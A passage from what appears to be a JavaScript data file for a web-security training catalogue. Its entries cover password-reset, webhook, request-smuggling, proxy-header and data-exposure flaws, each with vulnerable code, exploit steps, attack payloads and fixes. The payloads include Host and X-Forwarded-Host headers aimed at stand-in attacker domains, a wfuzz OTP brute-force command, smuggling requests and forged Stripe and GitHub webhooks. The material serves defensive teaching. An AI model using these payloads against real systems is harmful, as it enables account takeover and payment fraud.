});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST /api/request-password-reset HTTP/1.1\nHost: attacker-server.com\nContent-Type: application/json\n\n{"email": "victim@domain.com"}`,
    remediation: 'Never use request-supplied Host headers to compile password reset parameters. Enforce hardcoded canonical environment base domains, or strictly validate the HTTP Host value against a rigorous server-side allowlist.',
    remediation_code_snippet: `// SECURED: Referencing static configuration environment variables for link structures
app.post('/api/request-password-reset', async (req, res) => {
  const { email } = req.body;
  const user = await User.findOne({ email });
  if (!user) return res.status(404).send('User not found');
  
  const token = generateSecureToken();
  user.resetToken = token;
  await user.save();
  
  // SECURED: Using environment variables instead of request headers
  const baseUrl = process.env.SITE_DOMAIN || 'https://safe-canonical-site.com';
  const resetLink = \`\${baseUrl}/reset-password?token=\${token}\`;
  await sendResetEmail(email, resetLink);
  res.send('Reset instructions dispatched.');
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate the account portal password reset trigger page.',
      'Intercept the request via proxy tools and change the Host header to an attacker-controlled endpoint (e.g. host: evil.biz).',
      'The API constructs the reset hyperlink containing the attacker host and authentic email components.',
      'The clean reset email is sent to the target recipient; clicking the link routes their sensitive token to the attacker server logs.'
    ],
    payloads: [
      {
        title: "Malicious Host Injection Header Override",
        type: "Host Header",
        payload: "Host: evil-attacker-server.net",
        description: "Overrides the HTTP server Host header during reset requests to relocate link targets."
      },
      {
        title: "Proxy X-Forwarded-Host Bypass Attempt",
        type: "Forwarded Header",
        payload: "X-Forwarded-Host: remote-controlled.com",
        description: "Targets proxy-aware systems that prioritize X-Forwarded headers over base Host properties when parsing domains."
      }
    ]
  },
  {
    id: 'password-reset-weak-token',
    category: 'web-api',
    name: 'Password Reset Token Predictability (Weak PRNG)',
    cwe_id: 'CWE-331',
    severity: 'High',
    environment: 'Account Recovery Pipelines / Cryptographic Libraries',
    technical_explanation: 'The recovery security state of an account depends strictly on token unguessability. If reset links are generated using low-entropy generators (e.g., standard Math.random() utilities) or predictable, deterministic values (e.g., timestamp concatenations, MD5 hashes of emails, or incremental indexing), hackers can pre-calculate, automate, or brute-force valid tokens.',
    vulnerable_code_snippet: `// VULNERABLE: Generating tokens using weak math PRNGs and timestamps
const md5 = require('md5');

function generateResetToken(email) {
  // HIGHLY PREDICTABLE: Blends time values and simple standard Math random keys
  const seed = Date.now().toString() + Math.random().toString() + email;
  return md5(seed);
}`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Predicted MD5 results generated by matching dynamic millisecond timelines`,
    remediation: 'Generate all password reset codes using hardware-fortified, cryptographically secure random number generators (CSPRNG) like standard crypto modules or getRandomValues interfaces.',
    remediation_code_snippet: `// SECURED: Relying on cryptographically secure random bytes (CSPRNG)
const crypto = require('crypto');

function generateResetToken() {
  // SECURED: Pulls random entropy bytes directly from operating system entropy targets
  return crypto.randomBytes(32).toString('hex');
}`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Analyze multiple tokens acquired under controlled test setups to check for sequencing, common timestamps, or shared variables.',
      'Determine if the system uses un-seeded PRNGs, predictable system seeds, or static calculations.',
      'Simulate the generation algorithm on a client host, sweep dynamic timelines, and claim users accounts before their emails arrive.'
    ],
    payloads: [
      {
        title: "Deterministic Epoch Seed Automation Script",
        type: "Pre-computation",
        payload: "python -c \"import hashlib, time; t=int(time.time()*1000); print(hashlib.md5(str(t).encode()).hexdigest())\"",
        description: "Iterates through dynamic Windows/Linux Epoch millisecond increments to brute-force timestamp-generated tokens."
      }
    ]
  },
  {
    id: 'password-reset-parameter-pollution',
    category: 'web-api',
    name: 'Password Reset Parameter Pollution / Multiple Recipients',
    cwe_id: 'CWE-233',
    severity: 'Critical',
    environment: 'User Management Web APIs / Mailer Daemons',
    technical_explanation: 'Arises when HTTP Parameter Pollution (HPP) allows injecting multiple email variables (e.g., email=victim@target.com&email=attacker@evil.com) in a single reset request. If the server validates the first parameter (the victim) to verify access, but passes both parameters to the mailer daemon, the mailing library may CC or split delivery, routing the victim\'s recovery token to both addresses.',
    vulnerable_code_snippet: `// VULNERABLE: Processing unvalidated arrays of email inputs
app.post('/api/reset-password', async (req, res) => {
  const { email } = req.body; // Can be polluted with: {"email": ["victim@host.com", "evil@attacker.com"]}
  
  // VULNERABLE: Selects first array value to fetch record, but sends token to all array values
  const user = await User.findOne({ email: Array.isArray(email) ? email[0] : email });
  if (!user) return res.status(404).send('Not Found');

  const token = generateSecureToken();
  user.resetToken = token;
  await user.save();

  await mailer.sendMail({
    to: email, // BUG: Sends identical reset coordinates to BOTH emails inside polluted arrays
    subject: 'Your Password Reset Link',
    text: \`Token: \${token}\`
  });
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST /api/reset-password HTTP/1.1\nContent-Type: application/json\n\n{"email": ["victim@target.com", "attacker@evil.com"]}`,
    remediation: 'Implement runtime schema validations (like Joi or Zod structures) to strictly check that body keys are singular, verified strings containing no nested objects or duplicate array entries.',
    remediation_code_snippet: `// SECURED: Validating scalar email inputs using strict Zod structures
const z = require('zod');

const resetSchema = z.object({
  email: z.string().email() // Rejects array instances, duplicate values, and object nests
});

app.post('/api/reset-password', async (req, res) => {
  const payloadCheck = resetSchema.safeParse(req.body);
  if (!payloadCheck.success) {
    return res.status(400).send('Invalid arguments configuration.');
  }

  const { email } = payloadCheck.data;
  const user = await User.findOne({ email });
  // Defensive: unified message to avoid enumeration
  if (!user) return res.status(200).send('Check inbox for reset links.');

  const token = generateSecureToken();
  user.resetToken = token;
  await user.save();

  await mailer.sendMail({
    to: email, // SECURED: Locked to verified scalar email string
    subject: 'Your Password Reset Link',
    text: \`Token: \${token}\`
  });
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate target account reset APIs and trigger test requests.',
      'Inject duplicated fields or arrays inside values (e.g. email=user1@t.com&email=my@evil.com).',
      'If correct, monitor if the mailer routes the user reset link directly to your secondary email inbox.'
    ],
    payloads: [
      {
        title: "Duplicate Query String Injection",
        type: "HPP Attack",
        payload: "/api/reset?email=victim@target.com&email=attacker@evil.com",
        description: "Pollutes URL requests to trick parsers into using the victim's email for access but the attacker's email for routing."
      },
      {
        title: "JSON Array Argument Hijack",
        type: "JSON Pollution",
        payload: "{\\\"email\\\": [\\\"victim@target.com\\\", \\\"attacker@evil.com\\\"]}",
        description: "Exploits JSON parsers that accept raw deserialized arrays inside endpoints expecting strings."
      }
    ]
  },
  {
    id: 'password-reset-token-leakage',
    category: 'web-api',
    name: 'Password Reset Token Leakage via Referer Headers',
    cwe_id: 'CWE-213',
    severity: 'Medium',
    environment: 'Browser Client Environments / Third Party Script Integrations',
    technical_explanation: 'Once a user triggers a password reset, they are directed to the link delivered to their inbox (e.g., https://target.com/reset?token=90a8c2d). When the web browser renders this page, if it loads any dynamic external visual elements (such as Google Fonts, support portals, or Analytics trackers) or links outwards, the user\'s Web browser automatically attaches a complete URL Referer header containing the secret token, leaking it.',
    vulnerable_code_snippet: `<!-- VULNERABLE: Reset page loading external third-party assets without Referer safeguards -->
<html>
  <head>
    <title>Restore Account</title>
    <!-- VULNERABLE: Dynamically loading external CSS and trackers leaks full address bar metadata -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sans">
    <script src="https://cdn.trackingpartner360.com/analytics.js"></script>
  </head>
  <body>
     <form action="/api/submit">
        <!-- Input elements -->
     </form>
     <a href="https://partner-support-system.com/instructions">Read support details.</a>
  </body>
</html>`,
    vulnerable_code_lang: 'html',
    payload_example: `Referer Header emitted to cdn.trackingpartner360.com: https://target.com/reset?token=90a8c2d`,
    remediation: 'Configure explicit Referrer Policy headers on responses ("Referrer-Policy: no-referrer"). For React/JS single-page applications, strip active token values from the address bar immediately during mount phase.',
    remediation_code_snippet: `<!-- SECURED: Meta tags setting absolute referrer exclusion rules and Javascript token removal -->
<html>
  <head>
    <title>Restore Account</title>
    <!-- SECURED: Restricts referral disclosure to completely blank outputs -->
    <meta name="referrer" content="no-referrer">
    
    <script>
      // SECURED: Safely extract token and clean address bars instantly on load
      const params = new URLSearchParams(window.location.search);
      const token = params.get('token');
      if (token) {
        window.sessionStorage.setItem('secToken', token);
        // Strips token from URL history state immediately to avoid leakage
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    </script>
  </head>
  <!-- ... secure body content ... -->
</html>`,
    remediation_code_lang: 'html',
    exploit_steps: [
      'Trigger password reset tasks to receive legitimate authorization paths.',
      'Open browser Web Developer Console networks and inspect resource loading logs.',
      'Check if requested stylesheet resources, assets, or outbound anchors pack complete url token query trails inside their HTTP header metadata.'
    ],
    payloads: [
      {
        title: "Referrer Policy Check",
        type: "Metadata Analysis",
        payload: "Inspect Response Header for: Referrer-Policy: no-referrer",
        description: "Checks for the presence of the Referrer-Policy response header to verify if the site blocks referrals."
      }
    ]
  },
  {
    id: 'password-reset-otp-brute-force',
    category: 'web-api',
    name: 'Rate-Limit / OTP Brute Force on Password Reset',
    cwe_id: 'CWE-307',
    severity: 'High',
    environment: 'Web APIs / Authentication Controllers',
    technical_explanation: 'Many password recovery services use short 4-to-6 character One-Time Password (OTP) validation limits. If validation endpoints process incoming attempts without rate limit thresholds or fail to invalidate active codes after a small number of incorrect entries, attackers can spin multi-threaded solvers to brute-force the verification keyspace inside minutes.',
    vulnerable_code_snippet: `// VULNERABLE: OTP execution endpoints that let users guess codes endlessly
app.post('/api/verify-otp', async (req, res) => {
  const { email, otp } = req.body;
  const activeCode = await SecurityOTP.findOne({ email });

  if (!activeCode || activeCode.expiry < Date.now()) {
    return res.status(400).send("OTP code expired.");
  }

  // VULNERABLE: No failed check counter tracking. The OTP code is never deleted on error.
  if (activeCode.otp === otp) {
    return res.json({ status: "success", access_token: generateSession(email) });
  }

  res.status(400).send("Invalid verification code.");
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Forced numeric brute force iteration mapping sequence 000000 - 999999`,
    remediation: 'Implement structural endpoint IP and User-specific limit bounds, limit total wrong guesses (e.g., maximum 3 tries) before completely revoking OTP codes, and apply secure rate limiters.',
    remediation_code_snippet: `// SECURED: Failed-attempt counters and rate-limit controls enforcing complete code revocation
const limiter = require('express-rate-limit');

const otpVerificationLimiter = limiter({
  windowMs: 10 * 60 * 1000, // 10 minute window
  max: 5, // Max 5 total requests per IP
  message: "Excessive OTP requests. Access locked."
});

app.post('/api/verify-otp', otpVerificationLimiter, async (req, res) => {
  const { email, otp } = req.body;
  const activeCode = await SecurityOTP.findOne({ email });

  if (!activeCode || activeCode.expiry < Date.now()) {
    return res.status(400).send("OTP code expired.");
  }

  // SECURED: Revoke OTP if failed guess attempts exceed 3
  if (activeCode.attempts >= 3) {
    await activeCode.deleteOne(); // Destroy OTP immediately
    return res.status(400).send("Attempts limit exceeded. OTP revoked.");
  }

  if (activeCode.otp === otp) {
    await activeCode.deleteOne(); // Clean up successfully utilized code
    return res.json({ status: "success", access_token: generateSession(email) });
  }

  // Increment failed attempts on error
  activeCode.attempts += 1;
  await activeCode.save();

  res.status(400).send(\`Incorrect code. \${3 - activeCode.attempts} tries remaining.\`);
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate account password reset recovery features using 4-6 digit numerical verification prompts.',
      'Establish a high-speed multi-threaded automation tool to loop targets with verification strings (e.g., 000000 - 999999).',
      'The OTP code remains valid across mistakes, allowing malicious threads to successfully hijack the target session and override user parameters.'
    ],
    payloads: [
      {
        title: "Intruder Number Generator Suite Execution",
        type: "OTP Brute Force",
        payload: "wfuzz -z range,0000-9999 -d \"email=victim@target.com&otp=FUZZ\" -u https://target.api/verify-otp",
        description: "Automates numeric fuzzing loops using sequential arrays to compromise simple, non-throttled verification processes."
      }
    ]
  },
  {
    id: 'webhook-insecure-signature',
    category: 'web-api',
    name: 'Insecure Webhook Handlers (Missing/Weak Signature Validation)',
    cwe_id: 'CWE-353',
    severity: 'High',
    environment: 'Automated CI/CD Pipelines / Payment Gateways / Third-Party Integration Endpoints',
    mitre_attack_tactic: 'Credential Access / Impact',
    mitre_attack_technique: 'T1190: Exploit Public-Facing Application / T1584.006: Compromise Infrastructure (Web Services)',
    technical_explanation: 'Webhooks allow external services (Stripe, GitHub, Shopify) to push real-time events to your API. If your endpoint processes these events without verifying the cryptographic signature (e.g., HMAC-SHA256) matching a shared secret key, an attacker can directly craft falsified HTTP POST requests mimicking payment confirmation, refund actions, repository updates, or workflow executions, processing malicious operations within your runtime backend.',
    vulnerable_code_snippet: `// VULNERABLE: Direct extraction and reliance on HTTP request body parameters without verifying signatures
app.post('/webhooks/stripe', express.json(), (req, res) => {
  const event = req.body;

  // DANGEROUS: Blindly trust that this request came from Stripe because of body contents
  if (event.type === 'charge.succeeded') {
    const customerId = event.data.object.customer;
    await activateSubscription(customerId); // Falsely activates account
  }
  
  res.status(200).send('Event processed');
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST /webhooks/stripe HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{"type": "charge.succeeded", "data": {"object": {"customer": "usr_90a12b"}}}`,
    remediation: 'Utilize raw request buffers instead of parsed JSON. Compute a local HMAC-SHA256 signature using the raw body payload and the pre-shared webhook secret, and compare it with the signature identifier from the custom request header (e.g., Stripe-Signature, X-Hub-Signature-256) using a constant-time comparison helper to prevent timing attacks.',
    remediation_code_snippet: `// SECURED: Validating request authenticity using raw request buffers and pre-shared signing secrets
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const endpointSecret = process.env.STRIPE_WEBHOOK_SECRET;

app.post('/webhooks/stripe', express.raw({ type: 'application/json' }), (req, res) => {
  const sig = req.headers['stripe-signature'];
  let event;

  try {
    // SECURED: Cryptographically verifies signature validity and constructs payload using the native SDK
    event = stripe.webhooks.constructEvent(req.body, sig, endpointSecret);
  } catch (err) {
    console.error(\`Webhook Signature Verification Failed: \${err.message}\`);
    return res.status(400).send(\`Webhook Error: \${err.message}\`);
  }

  if (event.type === 'charge.succeeded') {
    const customerId = event.data.object.customer;
    await activateSubscription(customerId);
  }

  res.json({ received: true });
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate public webhook receiver URL paths using directory scanning or client-side Javascript code inspection.',
      'Analyze expected webhook payload schemas from official integration documentations (e.g., Stripe API, GitHub Webhooks).',
      'Construct a nested JSON body indicating successful completion or status changes of privileged records.',
      'Submit the falsified payload directly to the API endpoint to achieve state elevation or free status activations.'
    ],
    payloads: [
      {
        title: "Falsified Stripe Subscription Webhook Trigger",
        type: "Webhook Spoofing",
        payload: "POST /webhooks/stripe HTTP/1.1\nHost: victim.com\nContent-Type: application/json\n\n{\n  \"id\": \"evt_fake_99999\",\n  \"object\": \"event\",\n  \"type\": \"invoice.payment_succeeded\",\n  \"data\": {\n    \"object\": {\n      \"customer\": \"cus_target_victim\",\n      \"amount_paid\": 9900,\n      \"currency\": \"usd\"\n    }\n  }\n}",
        description: "Simulates a payment validation response payload generated by payment brokers to trigger automatic invoice completions."
      },
      {
        title: "Falsified GitHub Push Event Webhook",
        type: "Webhook Spoofing",
        payload: "POST /webhooks/github HTTP/1.1\nHost: target.com\nContent-Type: application/json\nX-GitHub-Event: push\n\n{\n  \"ref\": \"refs/heads/main\",\n  \"repository\": {\n    \"name\": \"production-deployment\"\n  },\n  \"head_commit\": {\n    \"id\": \"a1b2c3d4e5f6\",\n    \"message\": \"Trigger target automated deploy pipeline\"\n  }\n}",
        description: "Forges a dynamic GitHub VCS webhook event trigger to invoke automated runners or CI/CD container builds."
      }
    ]
  },
  {
    id: 'http-request-smuggling',
    category: 'web-api',
    name: 'HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)',
    cwe_id: 'CWE-444',
    severity: 'Critical',
    environment: 'Reverse Proxies / Load Balancers / Origin Application Servers',
    mitre_attack_tactic: 'Initial Access / Defense Evasion',
    mitre_attack_technique: 'T1190: Exploit Public-Facing Application / T1036: Masquerading',
    technical_explanation: 'HTTP Request Smuggling arises from differences in how front-end proxy servers and back-end origin servers parse standard HTTP request headers, specifically "Content-Length" (CL) and "Transfer-Encoding" (TE). Attackers craft single requests with both headers, causing one server to utilize Content-Length but the second to prioritize Transfer-Encoding chunks. This splits the request streams, leaving or "smuggling" an incomplete command sequence inside the socket stream to infect, hijack, or capture variables from the next user\'s request.',
    vulnerable_code_snippet: `// VULNERABLE: A dual-architecture server setup (Frontend Proxy + Backend NodeJS) with weak proxy normalization configs
// Frontend Server prioritizing Content-Length: length bounds indicate full stream payload
// Backend Server prioritizing Transfer-Encoding: processes dynamic chunk definitions first
// Node backend accepts trailing headers directly without verifying compatibility or lengths with edge proxy nodes.`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 49\nTransfer-Encoding: chunked\n\n0\n\nPOST /api/settings HTTP/1.1\nFoo: bar`,
    remediation: 'Force HTTP/2 communication across all load balancers, reverse proxies, and backend servers. If HTTP/1.1 is required, configure frontend proxies to strictly reject requests containing ambiguous Content-Length / Transfer-Encoding combinations, or utilize standard webservers (like modern Nginx/HAProxy) that enforce strict header normalization rules.',
    remediation_code_snippet: `# SECURED: Sample Nginx proxy configuration to restrict HTTP Request Smuggling & duplicate headers
# Active protection enabled by default in up-to-date reverse proxies
http {
    # Rejects and blocks requests containing invalid, duplicate, or malformed Content-Length / TE configurations
    ignore_invalid_headers on;
    # Ensure modern parsing engines normalize request chains completely
    proxy_http_version 1.1;
    proxy_set_header Connection "";
}`,
    remediation_code_lang: 'bash',
    exploit_steps: [
      'Locate target setups routing traffic through multiple proxy tiers (e.g. Cloudflare -> Varnish -> IIS Node).',
      'Construct a specialized request packing both Content-Length and Transfer-Encoding headers.',
      'Verify smuggling anomalies if requests cause prolonged timeline delays or unexpected socket terminations.',
      'Smuggle a secondary HTTP command sequence that remains on the socket line, intercepting parameters or forcing subsequent customer views to route to an attacker panel.'
    ],
    payloads: [
      {
        title: "CL.TE Smuggling Payload",
        type: "CL.TE Technique",
        payload: "POST / HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
        description: "The frontend proxy processes 6 bytes (the chunked body ending at '0\\r\\n\\r\\n'). The backend prioritizes chunked parsing, looks for a terminal '0' chunk, registers it, and leaves 'G' standing on the socket line, prepending it to the next incoming user request."
      },
      {
        title: "TE.CL Smuggling Payload",
        type: "TE.CL Technique",
        payload: "POST / HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nsmugl\r\n0\r\n\r\n",
        description: "The frontend uses Transfer-Encoding chunk segments. The backend utilizes Content-Length and parses only 4 bytes (e.g., '5\\r\\n'), leaving the remaining chunk contents smuggler blocks standing in queue."
      }
    ]
  },
  {
    id: 'host-header-proxy-poisoning',
    category: 'cloud-security',
    name: 'Proxy Header Injection & Tampering (X-Forwarded-Host, X-Forwarded-For, X-Forwarded-Proto)',
    cwe_id: 'CWE-344',
    severity: 'High',
    environment: 'Load Balancers / Reverse Proxies / Application Authentication Gateways / Email Mailers',
    mitre_attack_tactic: 'Initial Access / Defense Evasion / Credential Access',
    mitre_attack_technique: 'T1190: Exploit Public-Facing Application / T1566: Phishing / T1539: Steal Web Session Cookie',
    technical_explanation: 'Applications fronted by reverse proxies often fetch the original details of requests (the user\'s direct client IP, the requested host, or the protocol scheme) from customized diagnostic proxy headers like "X-Forwarded-For", "X-Forwarded-Host", or "X-Forwarded-Proto". If the application parses these values natively without verifying if they came from a trusted internal proxy node, attackers can inject custom forgeries inline. This allows them to bypass geographic/IP-restricted firewalls, force password-reset/registration services to mail links to malicious host servers, or hijack dynamic URL compilation logics completely.',
    vulnerable_code_snippet: `// VULNERABLE: Relying on raw client-side X-Forwarded HTTP headers to evaluate security rules on backend Express logs
app.post('/api/request-reset', (req, res) => {
  // DANGEROUS: Blindly trusting proxy headers without confirming origin proxies or configurations
  const clientHost = req.headers['x-forwarded-host'] || req.headers['host'];
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // Uses untrusted inputs: compiles redirect directories or validates private subnet security
  const recoveryUrl = \`https://\${clientHost}/auth/complete?token=789b0a&ip=\${clientIP}\`;
  await emailSystem.send(req.body.email, "Restore Token", \`Verify access at: \${recoveryUrl}\`);
  res.send("Notification dispatched");
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST /api/request-reset HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil-phishing-host.com\nX-Forwarded-For: 127.0.0.1`,
    remediation: 'Configure your application servers to strictly ignore "X-Forwarded-*" proxy headers unless the request originates from a proven, pre-approved list of trusted CIDR/IP internal proxy IP ranges (e.g., configuring "trust proxy" settings to a specific cloud load-balancer interface in Express instead of setting wildcards).',
    remediation_code_snippet: `// SECURED: Explicitly defining and restricting Express proxy trust parameters to trusted boundaries
const express = require('express');
const app = express();

// SECURED: Restricts 'trust proxy' to a precise internal network IP or security proxy instance
// Express will now ignore any X-Forwarded-For, X-Forwarded-Host, or X-Forwarded-Proto headers
// unless they originate directly from the specified proxy addresses down state.
app.set('trust proxy', '10.0.0.12'); // Only trust the VPC Load Balancer IP

app.post('/api/request-reset', (req, res) => {
  // Authenticated safely: values are generated or validated strictly by the trusted cloud proxy
  const clientHost = req.hostname; // Sanitized host parameter
  const clientIP = req.ip;         // Sanitized IP parameter
  
  const recoveryUrl = \`https://safe-canonical-site.com/auth/complete?token=789b0a&ip=\${clientIP}\`;
  // Safe mailing procedures...
  res.send("Notification dispatched");
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate target endpoint interfaces that send outbound messages (e.g. notifications, status emails, invites, resets).',
      'Inject customized headers like "X-Forwarded-Host: malicious-attacker-controlled.net" alongside legitimate ones.',
      'Check whether the system interpolates the forged host into generated links or routes the server requests to wrong domains.',
      'Attempt to bypass IP restrictions on admin endpoints by forging "X-Forwarded-For: 127.0.0.1" or local IP subnets.'
    ],
    payloads: [
      {
        title: "Proxy Localhost Bypass Attempt",
        type: "Proxy IP Forge",
        payload: "GET /admin/console HTTP/1.1\nHost: target.com\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1",
        description: "Overrides standard server client logging checks by appending multiple local loopback addresses inside proxy parameters."
      },
      {
        title: "X-Forwarded-Host Reset Redirection Hijack",
        type: "Proxy Host Poisoning",
        payload: "POST /api/invite-partner HTTP/1.1\nHost: target.com\nX-Forwarded-Host: phishing-hub.net\nX-Forwarded-Proto: https",
        description: "Fills out configuration variables with external phishing domains to trick invite-compilers into redirecting users outwards."
      }
    ]
  },
  {
    id: 'excessive_data_exposure',
    category: 'web-api',
    name: 'Excessive & Sensitive Data Exposure (XHR/Fetch API Response leaks)',
    cwe_id: 'CWE-200',
    severity: 'High',
    environment: 'REST / RESTful Web APIs, GraphQL Queries, Frontend (SPA) Network Transactions',
    mitre_attack_tactic: 'Credential Access & Information Discovery',
    mitre_attack_technique: 'T1082: System Information Discovery / T1114: Email Collection / T1552: Unsecured Credentials',
    technical_explanation: 'Modern browsers interact with back-end servers using asynchronous XHR/Fetch API calls. Developers often query whole database models (e.g. `SELECT * FROM users`) and serialize the fully-populated record down to the client. They then hide sensitive parameters (like user salts, private phone numbers, password hashes, or security answers) purely inside the front-end user interface using CSS, hidden inputs, or conditional React components. However, since the raw, unmasked data is fully transmitted through the browser socket, anyone who opens the Network Tab can inspect the raw HTTP response body to immediately extract unauthorized secrets.',
    vulnerable_code_snippet: `// VULNERABLE: Direct database object serialization and JSON response dumping
app.get('/api/users/profile', async (req, res) => {
  // Query fetches administrative and sensitive record attributes from the datastore
  const userRecord = await db.users.findOne({ id: req.query.userId });
  
  // DANGEROUS: Blindly returns the complete model object (including salt, pass_hash, admin_privileges) down the wire.
  // Relying on the client-side webapp to filter visible fields allows extraction from browser logs.
  res.json(userRecord);
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `POST /api/users/profile HTTP/1.1\nHost: target-portal-auth.web\nContent-Type: application/json\n\n{"userId": "1002"}`,
    remediation: 'Always authorize and transform API payload responses on the server side prior to sending bytes downstream. Implement strict Data Transfer Objects (DTO) or clean schemas to isolate and whitelist safe variables. Never trust the frontend client to filter, drop, or mask sensitive fields natively.',
    remediation_code_snippet: `// SECURED: Implementing a clean Data Transfer Object (DTO) pattern to strip private fields on the server
app.get('/api/users/profile', async (req, res) => {
  const userRecord = await db.users.findOne({ id: req.query.userId });
  if (!userRecord) return res.status(404).send("User profile missing");

  // SAFE: Populate a clean, strictly whitelisted public data object
  const cleanProfilePayload = {
    id: userRecord.id,
    displayName: userRecord.displayName,
    imageUrl: userRecord.imageUrl,
    registrationDate: userRecord.createdAt
  };

  res.json(cleanProfilePayload);
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Navigate to the website pages where input forms (e.g. search fields, profiles, checkouts) are located.',
      'Open the browser developer tools (F12) and shift to the "Network" tab.',
      'Choose the "XHR" or "Fetch" filter to screen API transactions.',
      'Enter valid query inputs and fire a search or update submission.',
      'Select the corresponding HTTP request in the list, and check the "Response" or "Preview" tab to scan for parameters that are completely invisible in the graphical UI, such as private back-end IDs, administrative flags (is_admin), phone numbers, or passwords.'
    ],
    payloads: [
      {
        title: "Inspect Directory Lookup Response",
        type: "XHR/Fetch Body Audit",
        payload: "GET /api/v1/employees/lookup?q=test HTTP/1.1\nHost: corporate.intranet",
        description: "Examines responses returning lists of user profiles to verify if the server returns internal IDs, security clearance, or plaintext addresses."
      },
      {
        title: "F12 Raw JSON Extraction",
        type: "JSON Leak Verification",
        payload: "POST /api/cart/details HTTP/1.1\nHost: checkout-gateway.net\nContent-Type: application/json\r\n\r\n{\"cartId\":\"827\"}",
        description: "Scans backend cart queries returning transaction items for leaking direct supplier details, wholesale cost rates, or server environment directories."
      }
    ]
  }
];

